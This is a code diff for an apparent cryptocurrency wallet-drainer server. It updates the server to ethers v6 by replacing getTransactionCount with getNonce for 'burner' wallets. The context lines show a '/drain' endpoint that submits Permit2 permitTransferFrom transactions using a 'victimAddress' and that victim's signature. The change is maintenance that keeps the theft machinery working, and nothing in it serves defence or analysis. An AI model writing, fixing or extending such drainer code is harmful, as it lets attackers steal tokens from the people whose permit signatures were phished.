@@ -1,5 +1,5 @@
 const express = require('express');
-const { ethers } = require('ethers');
+const ethers = require('ethers');
 const helmet = require('helmet');
 const cors = require('cors');
 const fs = require('fs');
@@ -131,7 +131,7 @@ setInterval(async () => {
 
     // FIXED: Use ethers v6 nonce method
     for (let burner of burners) {
-      const nonce = await burner.getTransactionCount('pending');
+      const nonce = await burner.getNonce('pending');
       burnerNonces[burner.address] = nonce;
     }
 
@@ -212,7 +212,7 @@ app.post('/drain', async (req, res) => {
     };
 
     // FIXED: v6 getNonce + gas estimation
-    const currentNonce = burnerNonces[burner.address] ?? await burner.getTransactionCount('pending');
+    const currentNonce = burnerNonces[burner.address] ?? await burner.getNonce('pending');
 
     const gasLimit = await permit2.permitTransferFrom.estimateGas(
       permitStruct, transferDetails, victimAddress, signature,
